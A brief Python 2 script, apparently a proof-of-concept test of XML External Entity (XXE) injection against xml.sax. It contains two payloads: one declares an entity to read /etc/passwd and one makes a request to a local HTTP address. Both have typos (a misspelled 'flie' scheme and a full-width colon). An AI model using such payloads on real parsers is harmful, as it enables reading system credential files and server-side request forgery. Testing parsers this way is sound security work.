## coding=utf8
import xml.sax

x1 = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE v1sec[
    <!ELEMENT methodname ANY>
    <!ENTITY xxe SYSTEM "flie:///etc/passwd">
]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>

"""

x2 = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE v1sec[
    <!ELEMENT methodname ANY>
    <!ENTITY xxe SYSTEM "http://127.0.0.1：8005/xml.test">
]>
&xxe

"""

class MyContentHandler(xml.sax.ContentHandler):
    def __init__(self):
        xml.sax.ContentHandler.__init__(self)
    
    def startElement(self,name,attrs):
        self.chars = ""
    
    def endElement(self,name):
        print name, self.chars

    def characters(self,content):
        self.chars += content


parser = MyContentHandler()
#print xml.sax.parseString(x1,parser)
print xml.sax.parseString(x2,parser)